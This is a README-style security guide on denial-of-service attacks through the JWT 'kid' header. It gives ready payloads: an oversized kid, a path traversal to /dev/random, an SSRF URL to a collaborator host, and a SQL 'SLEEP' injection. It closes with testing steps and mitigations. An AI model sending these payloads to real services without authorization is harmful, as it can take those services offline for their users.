# JWT-Denial-of-Service-DoS-via-KID-Injection

This repository documents how attackers can trigger **Denial of Service (DoS)** conditions in applications that use **JWT (JSON Web Tokens)** with a dynamic `kid` (Key ID) lookup mechanism.

Many JWT implementations load the signing key based on the `kid` value from headers.  
If the server does NOT sanitize the `kid`, this can be abused to cause:

- **CPU exhaustion**
- **File-system traversal**
- **Network delays (SSRF-based DoS)**
- **Server timeouts**
- **Slow responses → Service degradation**

This README is for **educational and authorized security testing only.**

---

# What is kid ?

kid = **Key ID**  
It tells the server **which signing key** to load when validating a JWT.

Example:

<img width="841" height="394" alt="Screenshot 2025-12-01 172834" src="https://github.com/user-attachments/assets/51355fcf-4e3a-4157-8562-a596d4b3e326" />



normal header:

json
{
  "alg": "RS256",
  "kid": "default"
}

If the backend does something like:

loadKey("/keys/" + kid)


→ it becomes vulnerable.

# DoS Attack Types #

Below are the main DoS vectors using the kid header.

# 1️. Large String DoS (CPU/Memory Exhaustion)#

A very large kid value forces the backend to process a huge string.

Malicious Header Example
{
  "alg": "RS256",
  "kid": "A".repeat(500000)   // 500K characters
}

**Result (expected)**

Server becomes slow
High memory usage
Request takes several seconds
In extreme cases → API stops responding

# 2️. File System Traversal DoS #

Some servers read files based on kid.

Example backend:

fs.readFile("/keys/" + kid)

Malicious Header Example
{
  "alg": "RS256",
  "kid": "../../../../../../../../dev/random"
}

**Result**

Reading /dev/random blocks indefinitely, causing:

Long response times
Thread exhaustion
Temporary service unavailability

# 3️. SSRF DoS (Server Requests External Resource) #

If the server fetches keys from a URL in kid:

{
  "kid": "http://collaborator-server.com/test"
}

**How it becomes DoS**

If the URL takes 10–30 seconds to respond, each JWT validation blocks a server thread.

Example Payload
{
  "alg": "RS256",
  "kid": "http://f0gpz5hohnkefej8cf7v40xyfplg96xv.oastify.com/test"
}

**Expected Result**

Server experiences delay (5–30 seconds per request)

Massive slowdown if many tokens are validated

Possible outage under load

# 4️. SQL Lookup DoS via Slow Query #

If the server loads the key like:

SELECT key FROM jwt_keys WHERE kid = '$kid'

An attacker can inject a slow query.

Payload:
{
  "kid": "1' OR SLEEP(10)--"
}

 **Result**

Each JWT validation pauses for 10 seconds

Heavy DoS if multiple requests hit the server

 **How to Test DoS Safely**
✔ Send original token

Ensure it is still valid.

✔ Replace only the kid header

Keep the payload & signature unchanged.

✔ Check server responses

Does the response delay?
Does the CPU spike?
Do other endpoints slow down?

# Mitigation #

Limit kid length (max 50 chars)
Reject URLs in kid
Reject non-alphanumeric characters
Do not load files based on kid
Timeout remote lookups
Use caching for key retrieval
Validate kid against known list

**⚠ Disclaimer**

This material is only for authorized security testing.
Do NOT test this on systems without permission.
